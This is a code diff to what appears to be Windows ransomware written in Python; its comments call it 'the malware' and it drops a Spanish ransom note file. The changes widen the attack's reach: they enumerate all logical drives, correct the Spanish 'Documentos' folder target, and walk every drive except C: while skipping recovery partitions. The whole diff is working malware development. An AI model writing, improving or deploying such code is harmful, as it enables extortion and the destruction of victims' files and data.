@@ -68,6 +68,9 @@ import ctypes
 import urllib.request
 import png
 import base64
+import string
+import win32api
+from ctypes import windll
 from cryptography.fernet import Fernet
 from winshell import win32con
 
@@ -274,6 +277,16 @@ Muchas gracias por su amable colaboracion ;-)'
     with open(fr'{threatAddress}\INSTRUCCIONES_DEL_ATAQUE.txt', 'w') as f:        
         f.write(contents) 
 
+def get_drives():
+    drives = []
+    bitmask = windll.kernel32.GetLogicalDrives()
+    for letter in string.ascii_uppercase:
+        if bitmask & 1:
+            drives.append(letter)
+        bitmask >>= 1
+
+    return drives
+
 # This tells the malware were the users are in windows.
 directory = r'C:\Users'
 users = findUsers(directory)
@@ -285,7 +298,7 @@ target_dirs = [
     'Documents',
     'Escritorio',
     'Descargas',
-    'Documents',
+    'Documentos',
 ]
 
 # This makes sure they are inside of users.
@@ -300,8 +313,19 @@ raw_additional_folders = [
     r'C:\Program Files\LibreOffice',
 ]
 
-# Lists all of the possible drives.
-units = [f'{chr(n)}:\\' for n in range (97, 123) if n != 99]
+# Lists all of the possible drives and skips the RECOVERY partition.
+units = []
+for n in range (97, 123):
+    if n == 99:
+        continue 
+    dname = f'{chr(n)}:\\'
+    finfo = win32api.GetVolumeInformation(dname)
+    infoname = finfo[0]
+    if infoname == "RECOVERY":
+        continue
+    units.append(dname)
+
+# Adds all of the drives to the additional folders.
 raw_additional_folders += units
 
 # This puts all of the aditional files toguether.
